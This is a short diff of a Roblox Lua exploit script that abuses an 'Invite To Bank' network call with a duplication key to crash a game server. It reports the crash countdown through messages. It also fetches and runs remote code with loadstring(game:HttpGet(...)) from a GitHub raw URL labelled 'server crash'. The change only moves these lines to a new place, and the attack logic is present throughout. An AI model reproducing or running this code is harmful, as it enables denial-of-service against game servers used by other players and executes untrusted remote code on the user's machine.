@@ -191,15 +191,6 @@ else
 end
 if lib.Network.Invoke("Invite To Bank", mybanks[1]['BUID'], dupeKey) then
     lib.Message.New("crashing server in 5 minutes");
-else
-    lib.Message.New("Failed to crash server (rejoin and execute script)");
-end;
-
-	end)
-end
-coroutine.wrap(LPNFV_fake_script)()
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/ZoroJuro23/Roblox/main/server%20crash",true))();
 lib.Message.New("1");
 lib.Message.New("2");
 lib.Message.New("3");
@@ -220,3 +211,14 @@ lib.Message.New("17");
 lib.Message.New("18");
 lib.Message.New("19");
 lib.Message.New("20");
+
+else
+    lib.Message.New("Failed to crash server (rejoin and execute script)");
+end;
+
+	end)
+end
+coroutine.wrap(LPNFV_fake_script)()
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ZoroJuro23/Roblox/main/server%20crash",true))();
+
